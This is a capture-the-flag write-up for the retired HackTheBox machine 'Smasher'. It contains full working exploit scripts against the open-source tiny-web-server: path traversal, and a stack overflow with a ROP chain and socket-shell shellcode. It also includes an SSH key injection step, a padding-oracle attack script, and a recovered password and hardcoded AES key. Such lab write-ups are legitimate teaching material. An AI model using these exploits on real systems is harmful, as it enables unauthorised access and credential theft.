---
title: HackTheBox-Smasher
author: a3nk17
date: 2019-01-11 
excerpt: Smasher is a really hard box with three challenges that require a detailed understanding of how the code you’re intereacting with works.In Beyond Root, I’ll check out the AES script, and show how I patched the checker binary.
thumbnail: /assets/img/posts/smasher/info.png
categories: [HackTheBox, Retired]
tags: [xakepru, write-up, hackthebox, machine, pwn-64, linux, masscan, tiny-web-server, path-traversal, wget-mirror, diff, code-analysis, gdb-fork, python3-pwntools, ret2shellcode, ret2bss, ssh-key-injection, linenum.sh, padding-oracle, aes-cbc, pkcs7, binary-analysis, reverse, race-condition, ghidra, cutter, strace, binary-patching, pvs-studio]
---


![info](/assets/img/posts/smasher/info.png)



Smasher is a really `hard` box with three challenges that require a detailed understanding of how the code you’re intereacting with works. It starts with an instance of shenfeng tiny-web-server running on port 1111. I’ll use a path traversal vulnerability to access to the root file system. I’ll use that to get a copy of the source and binary for the running web server. With that, I’ll write a buffer overflow exploit to get a reverse shell. Next, I’ll exploit a padding oracle vulnerability to get a copy of the smasher user’s password. From there, I’ll take advantage of a timing vulnerability in setuid binary to read the contents of root.txt. I think it’s possible to get a root shell exploiting a buffer overflow, but I wasn’t able to pull it off (yet). In Beyond Root, I’ll check out the AES script, and show how I patched the checker binary.

### Summary

- The `webserver` used is vulnerable to a path `traversal bug` and `buffer overflow` in the GET parameter
- By using the path traversal bug we can get the `Makefile` and copy of the webserver executable
- The buffer overflow can be solved by leaking libc's base address and then building a `ropchain` to `ret2libc`
- To gain user, we have to solve an `Oracle padding` challenge that gives us the user password
- Priv esc is a `race condition` in a suid root `ELF binary`, we can swap out the file with a `symlink` to /root/root.txt to get the root flag

### Tools used

- pwntools
- [https://libc.blukat.me/](https://libc.blukat.me/)
- [https://github.com/twd2/padding-oracle-attack/blob/master/attack.py](https://github.com/twd2/padding-oracle-attack/blob/master/attack.py)

# Intelligence service

## Port scan

I continue to mess with open port detection methods, so this time we'll use a bunch of Masscan and Nmap. Masscan, by the way, is by far the fastest asynchronous port scanner. In addition, it relies on its own vision of the TCP / IP stack and, [acording to developer](https://github.com/robertdavidgraham/masscan/blob/master/README.md), can scan the entire Internet in six minutes from one host.

```bash
root@kali:~# masscan --rate=1000 -e tun0 -p1-65535,U:1-65535 10.10.10.89 > ports
```

With the first command, I initiate a scan of the entire port range (including UDP) of the IP address where Smasher lives and redirect the result to a text file.

```bash
root@kali:~# ports=`cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr "\n" ',' | sed 's/,$//'`
root@kali:~# nmap -n -Pn -sV -sC -oA nmap/smasher -p$ports 10.10.10.89
```

Next, using standard text processing tools in `Linux`, I process the scan results so that the ports found are stored in one line separated by commas, save this line in a variable `ports` and let `Nmap` off the leash.

[![port-scan.png](/assets/img/posts/smasher/port-scan.png)](/assets/img/posts/smasher/port-scan.png)
{:.center-image}

According to Nmap, we are dealing with `Ubuntu 16.04 (Xenial)`. It is based on information [SSH Banner](https://launchpad.net/ubuntu/+source/openssh/1:7.2p2-4ubuntu2.4).  You can knock on ports 22 and 1111. On the latter, by the way, hangs a shenfeng `tiny-web-server` - so we will go to investigate it first.

## Web port 1111

### Browser

At the address `http://10.10.10.89:1111/` you will be greeted with a listing of the web server root directory.

[![listdir-root.png](/assets/img/posts/smasher/listdir-root.png)](/assets/img/posts/smasher/listdir-root.png)
{:.center-image}

Interestingly, the page `index.html` exists, but there is no redirect to it - instead, a list of directory files opens. Let's remember this.

[![index-html.png](/assets/img/posts/smasher/index-html.png)](/assets/img/posts/smasher/index-html.png)
{:.center-image}

If we go to `/index.html`manually, we will see a stub for the authorization form, which cannot be interacted with in any way (you can type in the input fields, but the Login button does not work). It's funny that both input fields are named `input.email`.

[![form-input-naming.png](/assets/img/posts/smasher/form-input-naming.png)](/assets/img/posts/smasher/form-input-naming.png)
{:.center-image}

### A tiny web server in C

If you search the net for `shenfeng tiny-web-server`, you will find the project repository on GitHub at the first link in the results . [repository](https://github.com/shenfeng/tiny-web-server) on  github GitHub.

The first thing that catches your eye is the cries about the insecurity of the code: the [First is](https://github.com/shenfeng/tiny-web-server/blob/master/README.md#non-features) in the server description itself `(as its only "anti-feature"),` the [Second](https://github.com/shenfeng/tiny-web-server/issues/2) — is open `Issue`

[![tiny-web-server-path-traversal-issue.png](/assets/img/posts/smasher/tiny-web-server-path-traversal-issue.png)](/assets/img/posts/smasher/tiny-web-server-path-traversal-issue.png)
{:.center-image}

If you believe the description, then the tiny-web-server is affected by Path Traversal, and the ability to browse directory listings seems to whisper in your ear: "This is how it is ...".

# Analysis of tiny-web-server

Let's check the feasibility of `Path Traversal`. Since Firefox likes to fix `syntactically` incorrect constructions in the address bar (in particular, to cut prefixes of the form `../../../)`, then I will do it using `nc`, as shown in `issue`.

[![tiny-web-server-path-traversal-poc.png](/assets/img/posts/smasher/tiny-web-server-path-traversal-poc.png)](/assets/images/pwn-kingdom/smasher/tiny-web-server-path-traversal-poc.png)
{:.center-image}

Which is what was required to prove - we have the ability to read files on the server!

What's next? Let's look around. If you duplicate the primary slash for accessing directories, the server thinks that this is how we are accessing the root directory - and exploration can be done directly from the browser.

[![path-traversal-home.png](/assets/img/posts/smasher/path-traversal-home.png)](/assets/img/posts/smasher/path-traversal-home.png)
{:.center-image}

We `/home` have only one directory available - `www/` .

[![path-traversal-www.png](/assets/images/pwn-kingdom/smasher/path-traversal-www.png)](/assets/images/pwn-kingdom/smasher/path-traversal-www.png)
{:.center-image}

Of the interesting things here: a script `restart.shfor` restarting an instance of the `server` process, as well as the directory with the project itself.

```bash
#!/usr/bin/env bash

# Please don't edit this file let others players have fun

cd /home/www/tiny-web-server/
ps aux | grep tiny | awk '{print $2}' | xargs kill -9
nohup ./tiny public_html/ 1111 2>&1 > /dev/null &
```

[![path-traversal-tiny-web-server.png](/assets/img/posts/smasher/path-traversal-tiny-web-server.png)](/assets/img/posts/smasher/path-traversal-tiny-web-server.png)
{:.center-image}

In order not to worry about downloading each file separately, I clone the `/home/wwwentire` directory using `wget`, excluding the directory `.git`- we will find out the `differences` in the web server code in comparison with the GitHub version a little later in a different way.
```bash
root@kali:~# wget --mirror -X home/www/tiny-web-server/.git http://10.10.10.89:1111//home/www/
```

[![wget-mirror.png](/assets/img/posts/smasher/wget-mirror.png)](/assets/img/posts/smasher/wget-mirror.png)
{:.center-image}

Three files are of interest to us: `Makefile`, `tiny` and `tiny.c`.

[![ls-www.png](/assets/img/posts/smasher/ls-www.png)](/assets/img/posts/smasher/ls-www.png)
{:.center-image}

It `Make` filecontains instructions for building an executable file.

```c
CC = c99
CFLAGS = -Wall -O2

# LIB = -lpthread

all: tiny

tiny: tiny.c
    $(CC) $(CFLAGS) -g -fno-stack-protector -z execstack -o tiny tiny.c $(LIB)

clean:
    rm -f *.o tiny *~
```

The flags `-g -fno-stack-protector -z execstackhint` to us on the supposed "in the plot" vector of attack - a `stack break`, which, I hope, has already managed to `fall in love with you`.

The file `tiny` is the binary itself, which is deployed to Smasher.

[![tiny-checksec.png](/assets/img/posts/smasher/tiny-checksec.png)](/assets/img/posts/smasher/tiny-checksec.png)
{:.center-image}

We have an executable stack, segments with the ability to write and `execute arbitrary` data and an active mechanism `FORTIFY`- the latter, however, will not affect anything in our situation 

## Changes to tiny.c source code

If you need to compare text files line by line, I prefer the[DiffTabs](https://packagecontrol.io/packages/DiffTabs) extension for Sublime Text, where - unlike the default `diff`- there is syntax highlighting. However, if you are used to working exclusively from the command line, this `colordiff`will be a convenient alternative.

Let's pull the latest version `tiny.c`from the github (we'll call it `tiny-github.c`) and compare it with the source that we captured on Smasher.

```bash
root@kali:~# wget -qO tiny-github.c https://raw.githubusercontent.com/shenfeng/tiny-web-server/master/tiny.c
root@kali:~# colordiff tiny-github.c tiny.c
```

```diff
166c166
<     sprintf(buf, "HTTP/1.1 200 OK\r\n%s%s%s%s%s",
---
>     sprintf(buf, "HTTP/1.1 200 OK\r\nServer: shenfeng tiny-web-server\r\n%s%s%s%s%s",
233a234,236
>     int reuse = 1;
>     if (setsockopt(listenfd, SOL_SOCKET, SO_REUSEADDR, (const char*)&reuse, sizeof(reuse)) < 0)
>         perror("setsockopt(SO_REUSEADDR) failed");
234a238,239
>     if (setsockopt(listenfd, SOL_SOCKET, SO_REUSEPORT, (const char*)&reuse, sizeof(reuse)) < 0)
>         perror("setsockopt(SO_REUSEPORT) failed");
309c314
<     sprintf(buf, "HTTP/1.1 %d %s\r\n", status, msg);
---
>     sprintf(buf, "HTTP/1.1 %d %s\r\nServer: shenfeng tiny-web-server\r\n", status, msg);
320c325
<         sprintf(buf, "HTTP/1.1 206 Partial\r\n");
---
>         sprintf(buf, "HTTP/1.1 206 Partial\r\nServer: shenfeng tiny-web-server\r\n");
346c351,355
< void process(int fd, struct sockaddr_in *clientaddr){
---
> int process(int fd, struct sockaddr_in *clientaddr){
>     int pid = fork();
>     if(pid==0){
>     if(fd < 0)
>       return 1;
377a387,389
>     return 1;
>   }
> return 0;
407a420
>     int copy_listen_fd = listenfd;
417,420c430
<
<     for(int i = 0; i < 10; i++) {
<         int pid = fork();
<         if (pid == 0) {         //  child
---
>     signal(SIGCHLD, SIG_IGN);
421a432
>
423c434,437
<                 process(connfd, &clientaddr);
---
>               if(connfd > -1)  {
>                 int res = process(connfd, &clientaddr);
>               if(res == 1)
>                       exit(0);
424a439,440
>               }
>
426,437d441
<         } else if (pid > 0) {   //  parent
<             printf("child pid is %d\n", pid);
<         } else {
<             perror("fork");
<         }
<     }
<
<     while(1){
<         connfd = accept(listenfd, (SA *)&clientaddr, &clientlen);
<         process(connfd, &clientaddr);
<         close(connfd);
<     }
438a443
>
```

Minor changes:
* added error handling ( `233a234`, `234a238`);
* the name of the developer appeared in the banner lines of the web server, which makes it easier for the attacker to identify the software at the stage of scanning the host ( `166c166`, `320c325`).

Important changes: the logic for processing client requests has been modified (everything related to the function `process`and the creation of forks). If `tiny-github.c`multithreading is implemented using the `PreFor`k concept, when the master process spawns the children in a cycle from `0 to 9`, then the tiny.cparent is forked only once - and not in the body main, but in the function itself process. I suppose this was done to ease the load on the server - after all, the ` VM` is attacking many people at the same time. Well, it only suits us, because `debugging` multi-threaded applications is still a pleasure.


## Find vulnerable line

At one of my university practices, the teacher set the following task: without access to the network, to within a line, find in the source code of the OpenSSL package the place responsible for the notorious [Heartbleed](https://ru.wikipedia.org/wiki/Heartbleed) vulnerability `(CVE-2014-0160)`. Of course, in most cases it is impossible to unambiguously blame a single line for all the troubles, but you can (and should) always allocate a place for yourself in the code from which you will build on during the attack.

Let's find such a string in `tiny.c`. In the format of an article, it is difficult to analyze source codes without a pile of repetitive information - so I will present the analysis in the form of a chain of "jumps" by function (starting from `main`and ending with the vulnerability), and then you yourself will `trace` this path in your editor.

```c
main() { int res = process(connfd, &clientaddr); } ==> process() { parse_request(fd, &req); } ==> parse_request() { url_decode(filename, req->filename, MAXLINE); }
```

The function `url_decode`takes three arguments: two arrays of strings (source `filename`and `destination`, `req->filenamerespectively`) and the number of `bytes` copied from the first array to the second. In our case, this is a constant `MAXLINE` equal to `1024`.
```c
void url_decode(char* src, char* dest, int max) {
    char *p = src;
    char code[3] = { 0 };
    while(*p && --max) {
        if(*p == '%') {
            memcpy(code, ++p, 2);
            *dest++ = (char)strtoul(code, NULL, 16);
            p += 2;
        } else {
            *dest++ = *p++;
        }
    }
    *dest = '\0';
}
```

The algorithm of the function is `trivial`: if the string with the name of the file that the client requests from the server in a GET request contains data in Percent-encoding (determined by the character `%`), the function performs decoding and places the corresponding byte in the destination `array`. Otherwise, a simple byte-by-byte copy of the file name occurs. But the whole problem is that the local array `filename` has a size `MAXLINE`(that is, `1024` bytes), but the `req->filename` structure field `http_request` (which has a variable type req) has only `512 bytes`.

```c
typedef struct {
    char filename[512];
    off_t offset;              /* for support Range */
    size_t end;
} http_request;
```

There is a classic  [Out-of-bounds Write](https://cwe.mitre.org/data/definitions/787.html) (`CWE-787`: writing out of bounds of available memory) - it makes it possible to break the stack.

In the epilogue, we will look at the analysis of the trace of this code, but for now we will think about how you can exploit the vulnerability `tiny.c`.

## Exploit development

First, let's enjoy the moment when the server `tiny` crashes. Since the child process of the program will crash with a segmentation fault, `Segmentation fault`we will not see the usual alert in the terminal window. To make sure that the process did not work correctly and ended with a segfault, I will open the kernel message log ` dmesg`(with a flag `-w`) and ask the server for a (non-existent) file with a name of a thousand A.



```bash
root@kali:~# ./tiny 1111
root@kali:~# dmesg -w
root@kali:~# curl localhost:1111/$(python -c 'print "A"*1000')
```

[![tiny-crash-poc.gif](/assets/img/posts/smasher/tiny-crash-poc.gif))](/assets/img/posts/smasher/tiny-crash-poc.gif)
{:.center-image}

Class: we see that the request knocks out a child process with a `general protection` fault (or a segmentation fault in our case).

### Search for a RIP dubbing point

Let's run the server executable file in the `GDB debugger`.

The classic GDB without the wraps by default monitors the execution of the parent process, but the installed `PEDA` assistant will monitor the child process if there was a fork during execution. This is equivalent to the setting `set follow-fork-mode childin` the original `GDB`.

```bash
root@kali:~# gdb-peda ./tiny
Reading symbols from ./tiny...
gdb-peda$ r 1111
Starting program: /root/htb/boxes/smasher/tiny 1111
listen on port 1111, fd is 3
```

Now an important point: I cannot use the de `Bruijn cyclic` pattern that `PEDA offers`, because it contains characters `'%'` - and they, if you remember, are interpreted by the server as the beginning of a `URL encoding`.

[![pattern-peda-percent.png](/assets/img/posts/smasher/pattern-peda-percent.png)](/assets/img/posts/smasher/pattern-peda-percent.png)
{:.center-image}

Hence, we need a different generator. You can use `msf-pattern_create  -l <N>`and `msf-pattern_offset -q <0xFFFF>`to create a sequence of the `desired length` and find the offset accordingly. However, I prefer a module `pwntools` that is much faster.
[![pattern-msf-pwntools.png](/assets/img/posts/smasher/pattern-msf-pwntools.png)](/assets/img/posts/smasher/pattern-msf-pwntools.png)
{:.center-image}
As we can see, none of the tools use `"bad"` characters, so you can use any of them to generate a `malicious URL`.

```bash
root@kali:~# curl localhost:1111/$(python -c 'import pwn; print pwn.cyclic(1000)')
File not found
```

We sent a request to open a non-existent page using `curl`- and now we look at what value has settled in the `RSP register`, and calculate the offset value to `RIP`.

```bash
gdb-peda$ x/xw $rsp
0x7fffffffdf48: 0x66616172
root@kali:~# python -c 'from pwn import *; print cyclic_find(unhex("66616172")[::-1])'
568
```
Answer: `568`.

After exiting the debugger, it would be good to `forcefully` kill all instances of the `web serve`r - after all, only the `child process` has definitely ended.

```bash
root@kali:~# ps aux | grep tiny | awk '{print $2}' | xargs kill -9
```

### Proof-of-Concept

Let's check that we can really overwrite the return address with an arbitrary value. To do this, we will write a simple Python script that will open a remote (in our case, local) socket and send a string of the form there `GET /<fuck dataset>`.

Despite the fact that the development has not yet been ported to the stable branch, I `nevertheless` decided to experiment with pwntools for the third version of Python.

It is installed like this.

```bash
$ apt install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential -y
$ python3 -m pip install --upgrade git+https://github.com/Gallopsled/pwntools.git@dev3
```

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Использование: python3 poc.py [DEBUG]

from pwn import *

context.arch      = 'amd64'
context.os        = 'linux'
context.endian    = 'little'
context.word_size = 64

payload = b''
payload += b'A' * 568
payload += p64(0xd34dc0d3)

r = remote('localhost', 1111)
r.sendline(f'GET /{payload}')
r.sendline()
```
With the server running in the background in the debugger, let's run the script and make sure that the process crashed with a `"dead code"` in the `RIP register`.

[![poc-py-fail.png](/assets/img/posts/smasher/poc-py-fail.png)](/assets/img/posts/smasher/poc-py-fail.png)
{:.center-image}

It didn't work the first time ... What went wrong? The value is `0xd34dc0d3` packed in little-endian format for x86-64, so it actually looks like ` 0x00000000d34dc0d3`. On reading the `first zero byte` , the `server crashed` . Why? Because it uses a function ` sscanf`( line 278 tiny.c ) to parse the request - and it writes our `payload` into an array `uriuntil` it `stumbles` over a `null terminator`.

To avoid this, before sending, we convert the entire payload to Percent-encoding using `urllib.parse.quote`.

```python
from urllib.parse import quote as url_encode
r.sendline(f'GET /{url_encode(payload)}')
```

Then everything will go as it should.

[![poc-py-success.png](/assets/img/posts/smasher/poc-py-success.png)](/assets/img/posts/smasher/poc-py-success.png)
{:.center-image}

### Getting a shell


There are several options for obtaining a user session on whose behalf the web server is running.

The first is a `full-fledged` Return-to-`PLT` attack with the extraction of the address of a function from an `executable file` ( reador write, for example). This will tell us where libc is loaded and can call it `systemusing` the classic `ret2libc` technique. This exactly repeats the material of the third part of the cycle - only this time we would have to redirect the output of the shell to the socket through the `C` function `dup2` , and it needs to be called three times for each of the standard streams: input, output and `errors`.

The function write, for example, takes three arguments with the size of the output string at the end - we would load it into the RDX register. However, there are no gadgets of the type `pop rdx`; ret, so we would have to look for an alternative way to `initialize RDX`. For example, use a function `strcmpthat` puts the difference in the compared strings into the RDX.

It's long and boring, so luckily there is a second way. You can take advantage of the compile flag -z execstack- you remember what was in Makefile? This option brings back to our arsenal the ancient `Return-to-shellcode` attack - in particular, Return-to-bss.

The idea is simple: readI use a function to write the `shellcode` to the section of uninitialized variables. And then, through the `classic Stack Overflow`, I will transfer control to it - it .bssdoes not fall under the ASLR and has a bit of execution. The latter can be verified using the combination `vmmap` and `readelf`.

[![tiny-vmmap-readelf.png](/assets/img/posts/smasher/tiny-vmmap-readelf.png)](/assets/img/posts/smasher/tiny-vmmap-readelf.png)
{:.center-image}

For a classification of ASLR bypass techniques, see the ASLR Smack & Laugh Reference, [PDF](https://ece.uwaterloo.ca/~vganesh/TEACHING/S2014/ECE458/aslr.pdf).

For the second variant of the attack, the payload will take the following form.

```
ПЕЙЛОАД = 
    (1) МУСОР_568_байт +
    (2) СМЕЩЕНИЕ_ДО_ГАДЖЕТА_pop_rdi +
    (3) ЗНАЧЕНИЕ_ДЕСКРИПТОРА_socket_fd +
    (4) СМЕЩЕНИЕ_ДО_ГАДЖЕТА_pop_rsi +
    (5) СМЕЩЕНИЕ_ДО_СЕКЦИИ_bss +
    (6) СМЕЩЕНИЕ_ДО_read@plt
    (7) СМЕЩЕНИЕ_ДО_СЕКЦИИ_bss <== прыжок на шелл-код
```

Items 1–5 set two arguments for the function `read`- they are stored in the RDI and RSI registers, respectively. Please note: we do not explicitly set the number of bytes to read (the third argument is the RDX register), because working with RDX is a pain in building ropchains. Instead, we rely on luck: during execution, RDX usually stores values ​​large enough for us to write the shellcode.

In step 6, we call the function itself read(by accessing the `PLT table`), which will write the shellcode to the section .bss. The final touch - the 7th point - will transfer control to the shellcode: this will happen after reaching the instruction retin the function `read@plt`.


```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Использование: python3 tiny-exploit.py [DEBUG]

from pwn import *
from urllib.parse import quote as url_encode

context.arch      = 'amd64'
context.os        = 'linux'
context.endian    = 'little'
context.word_size = 64

elf = ELF('./tiny', checksec=False)
bss = elf.bss()  # elf.get_section_by_name('.bss')['sh_addr'] (address of section header .bss)

rop = ROP(elf)
rop.read(4, bss)
rop.raw(bss)
log.info(f'ROP:\n{rop.dump()}')

r = remote('10.10.10.89', 1111)

raw_input('[?] Send payload?')
r.sendline(f'GET /{url_encode(b"A"*568 + bytes(rop))}')
r.sendline()
r.recvuntil('File not found')

raw_input('[?] Send shellcode?')
r.sendline(asm(shellcraft.dupsh(4)))  # asm(shellcraft.amd64.linux.dupsh(4), arch='amd64'), 70 bytes

r.interactive()
```

Let's go through the most interesting points.

```python
bss = elf.bss()
rop = ROP(elf)
rop.read(4, bss)
rop.raw(bss)
```

These four lines create a ROP chain: find a section `.bss`and call a function `read` with the required arguments.

```python
r.sendline(asm(shellcraft.dupsh(4)))
```

Here you can truly wonder what `pwntools` is capable of: in one line `"on the fly"` it generated an `assembler shellcode` with the following content.

[![pwntools-shellcraft.png](/assets/img/posts/smasher/pwntools-shellcraft.png)](/assets/img/posts/smasher/pwntools-shellcraft.png)
{:.center-image}
In our case, this is the code for Linux x64 - the version and bitness of the OS are taken from the context initialization.

the [dupsh](https://docs.pwntools.com/en/stable/shellcraft/amd64.html#pwnlib.shellcraft.amd64.linux.dupsh) method generates code that spawns the shell and redirects all standard streams to the network socket. We need a socket with a descriptor value 4: this number was assigned to the new open connection with the client (variable `connfd`, `line 433` ) when parsing the executable file locally. This is logical, because the values ​​are `0-3` already taken ( `0, 1` and `2` are standard streams, `3` is a handle to the parent), so the fork process gets the first `unoccupied ID` - four.
[![tiny-exploit.png](/assets/img/posts/smasher/tiny-exploit.png)](/assets/img/posts/smasher/tiny-exploit.png)
{:.center-image}

Great, we got a user session `www`. An interesting point: the ROP gadget `pop rsi; ret` in its `"pure form"` was not in the `binar`, so clever pwntools used a chain `pop rsi; pop r15` ; retand filled the `R15 register` with a `"garbage"` value `iaaajaaa`.

The exploit for which the ropchain is hardcoded
``tiny-exploit-manually.py ``
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Использование: python3 tiny-exploit-manually.py [DEBUG]

from pwn import *
from urllib.parse import quote as url_encode

context.arch      = 'amd64'
context.os        = 'linux'
context.endian    = 'little'
context.word_size = 64

elf = ELF('./tiny', checksec=False)
bss = elf.bss()  # elf.get_section_by_name('.bss')['sh_addr'] (address of section header .bss)

payload = b''
payload += b'A' * 568     # junk
payload += p64(0x4011dd)  # pop rdi; ret
payload += p64(0x4)       # fd => RDI
payload += p64(0x4011db)  # pop rsi; pop r15; ret
payload += p64(bss)       # .bss => RSI
payload += p64(0x0)       # junk => R15
payload += p64(0x400cf0)  # ret to read@plt
payload += p64(bss)       # ret to shellcode

r = remote('10.10.10.89', 1111)

raw_input('[?] Send payload?')
r.sendline(f'GET /{url_encode(payload)}')
r.sendline()
r.recvuntil('File not found')

raw_input('[?] Send shellcode?')
r.sendline(asm(shellcraft.dupsh(4)))  # asm(shellcraft.amd64.linux.dupsh(4), arch='amd64'), 70 bytes

r.interactive()
```


# From Rough Shell to SSH - Port 22
In order not to suffer with the clumsy shell of the pwntools interactive shell, we will gain access to the machine via `SSH` - using our `public key injection`. But first, let's make sure that key `authentication` is enabled for this user.


```bash
root@kali:~# ssh -vvv www@10.10.10.89 2>&1 | grep 'Authentications that can continue:'
www@10.10.10.89's password: debug1: Authentications that can continue: publickey,password
```

Next, we'll generate a key pair using OpenSSL and drop the public key into a file `/home/www/.ssh/authorized_keys`.

```bash
root@kali:~# ssh-keygen -f user_www
root@kali:~# cat user_www.pub
<СОДЕРЖИМОЕ_ОТКРЫТОГО_КЛЮЧА>
root@kali:~# ./tiny-exploit.py
$ cd /home/www
$ mkdir .ssh
$ echo '<СОДЕРЖИМОЕ_ОТКРЫТОГО_КЛЮЧА>' > .ssh/authorized_keys
```

Now we can log in to the virtual machine using the Secure Shell protocol.

```bash
root@kali:~# chmod 600 user_www
root@kali:~# ssh -i user_www www@10.10.10.89
www@smasher:~$ whoami
www
```

[![ssh-key-inject.png](/assets/img/posts/smasher/ssh-key-inject.png)](/assets/img/posts/smasher/ssh-key-inject.png)
{:.center-image}

# Exploring the environment

Once inside Smasher, I set up a simple python server on my local machine and handed out a great exploration script[LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh). to the victim 

[![linenum-sh.png](/assets/img/posts/smasher/linenum-sh.png)](/assets/img/posts/smasher/linenum-sh.png)
{:.center-image}

As is often the case on `virtual` machines with Hack The Box, I found vectors for `privilege escalation` in the list of running processes and the listing of files with the `SUID bit set`.

```bash
root@kali:~# ps auxww | grep crackme
smasher    721  0.0  0.1  24364  1840 ?        S    13:14   0:00 socat TCP-LISTEN:1337,reuseaddr,fork,bind=127.0.0.1 EXEC:/usr/bin/python /home/smasher/crackme.py
```

[![suid-files.png](/assets/img/posts/smasher/suid-files.png)](/assets/img/posts/smasher/suid-files.png)
{:.center-image}

Both of these strange file ( `crackme.py` and `checker`) we use to improve to a normal user and root, respectively.

But first things first.

# PrivEsc: www → smasher

So, we have a mysterious `python` script that is suspended from the local interface on port `1337`. You can verify this using `netstat`.

```python
root@kali:~# netstat -nlp | grep 1337
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      -
```

We do not have enough rights to view the content.

```bash
root@kali:~# cat /home/smasher/crackme.py
cat: /home/smasher/crackme.py: Permission denied
```

Let's see what happens there by knocking on the address`localhost:1337`.

```bash
www@smasher:~$ nc localhost 1337
[*] Welcome to AES Checker! (type 'exit' to quit)
[!] Crack this one: irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdg==
Insert ciphertext: 
```

At first glance, this is a validator for the `AES ciphertext`.

[![crackme-py.png](/assets/img/posts/smasher/crackme-py.png)](/assets/img/posts/smasher/crackme-py.png)
{:.center-image}



## Exploit development
In our case, the script itself is the oracle `crackme.py`- it voluntarily "tells" whether the finishing of the ciphertext was correct. I will use the ready-made [python-paddingoracle](https://github.com/mwielgoszewski/python-paddingoracle),  which provides an interface for quickly developing a `"breaker"` for my situation.

But first, I will forward the `SSH tunnel` to my machine, since it `crackme.py `is only available on Smasher (seen from the socat option `bind=127.0.0.1`).

[![ssh-konami-codes.png](/assets/img/posts/smasher/ssh-konami-codes.png)](/assets/img/posts/smasher/ssh-konami-codes.png)
{:.center-image}

I use `Enter + ~C` SSH client hotkeys to open a command line and forward the tunnel without reconnecting. In this [POST](https://pen-testing.sans.org/blog/2015/11/10/protected-using-the-ssh-konami-code-ssh-control-sequences) author gives an interesting analogy: he compares such hotkeys to cheat codes for `Konami video games`.

Now I can ask "questions" to the oracle with Kali, referring to the address `localhost:1337`.

The exploit itself is trivial: I took  [EXAMPLE](https://mwielgoszewski.github.io/python-paddingoracle/) from the main page of the module as a basis - and used pwntools to support the "communication" between the socket where the oracle sits and my script.

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Использование: python crackme-exploit.py

import os

from pwn import *
from paddingoracle import BadPaddingException, PaddingOracle
from Crypto.Cipher import AES

BLOCK_SIZE = AES.block_size


class PadBuster(PaddingOracle):
    def __init__(self, **kwargs):
        self.r = remote('localhost', 1337)
        log.info('Progress:\n\n\n\n')
        super(PadBuster, self).__init__(**kwargs)

    def oracle(self, data, **kwargs):
        os.write(1, '\x1b[3F')  # escape-последовательность для очистки трех последних строк вывода
        print(hexdump(data))
        self.r.recvuntil('Insert ciphertext:')
        self.r.sendline(b64e(data))
        recieved = self.r.recvline()

        if 'Invalid Padding!' in recieved:
            # An HTTP 500 error was returned, likely due to incorrect padding
            raise BadPaddingException


if __name__ == '__main__':
    ciphertext = b64d('irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdg==')
    log.info('Ciphertext length: %s byte(s), %s block(s)' % (len(ciphertext), len(ciphertext) // BLOCK_SIZE))

    padbuster = PadBuster()
    plaintext = padbuster.decrypt(ciphertext, block_size=BLOCK_SIZE, iv='\x00'*16)

    log.success('Cracked: %s' % plaintext)
```

To build your own `"breaker"`, you just need to `override` the method `oracle` in the class `PadBuster`, thus implementing interaction with the oracle.

[![crackme-exploit.gif](/assets/img/posts/smasher/crackme-exploit.gif))](/assets/img/posts/smasher/crackme-exploit.gif)
{:.center-image}

The method `decrypt` focuses on two blocks: recoverable ( `P2`) and fetching ( `C1`'). The second block of ciphertext (`recoverable`) remains unchanged, while the first block (fetching) is initially filled with `zeros`. At the start of the attack, the last byte of the first block, starting from the value 0xff, is reduced until an exception is handled `BadPaddingException`. After that, the focus is `shifted` to the penultimate byte, the process is repeated again - and so on for all `subsequent blocks`.

[![crackme-exploit.png](/assets/img/posts/smasher/crackme-exploit.png)](/assets/img/posts/smasher/crackme-exploit.png)
{:.center-image}

`Ten minutes later`, we have the contents of all four `blocks` of the `secret message` (in the last block, by the way, it lacked `6 bytes` to its full length) with the password of the user `smasher`. Now we can elevate `privileges` and remove the `user flag`.

I would like to note that we managed to decrypt even the first PCB block, since we guessed the initialization vector. It, as will be seen from the content `crackme.py`, consisted entirely of zeros.

```bash
www@smasher:~$ su - smasher
Password: PaddingOracleMaster123
smasher@smasher:~$ whoami
smasher
smasher@smasher:~$ cat user.txt
baabc5e4????????????????????????
```

## Crackme.py content

We can now read the script `crackme.py`. Let's take a look at the content for `educational purposes`.

```python
from Crypto.Cipher import AES
import base64
import sys
import os

unbuffered = os.fdopen(sys.stdout.fileno(), 'w', 0)

def w(text):
    unbuffered.write(text+"\n")

class InvalidPadding(Exception):
    pass

def validate_padding(padded_text):
    return all([n == padded_text[-1] for n in padded_text[-ord(padded_text[-1]):]])


def pkcs7_pad(text, BLOCK_SIZE=16):
    length = BLOCK_SIZE - (len(text) % BLOCK_SIZE)
    text += chr(length) * length
    return text


def pkcs7_depad(text):
    if not validate_padding(text):
        raise InvalidPadding()
    return text[:-ord(text[-1])]


def encrypt(plaintext, key):
    cipher = AES.new(key, AES.MODE_CBC, "\x00"*16)
    padded_text = pkcs7_pad(plaintext)
    ciphertext = cipher.encrypt(padded_text)
    return base64.b64encode(ciphertext)


def decrypt(ciphertext, key):
    cipher = AES.new(key, AES.MODE_CBC, "\x00"*16)
    padded_text = cipher.decrypt(base64.b64decode(ciphertext))
    plaintext = pkcs7_depad(padded_text)
    return plaintext


w("[*] Welcome to AES Checker! (type 'exit' to quit)")
w("[!] Crack this one: irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdg==")
while True:
    unbuffered.write("Insert ciphertext: ")
    try:
        aes_hash = raw_input()
    except:
        break
    if aes_hash == "exit":
        break
    try:
        decrypt(aes_hash, "Th1sCh4llang31SInsane!!!")
        w("Hash is OK!")
    except InvalidPadding:
        w("Invalid Padding!")
    except:
        w("Generic error, ignore me!")
```

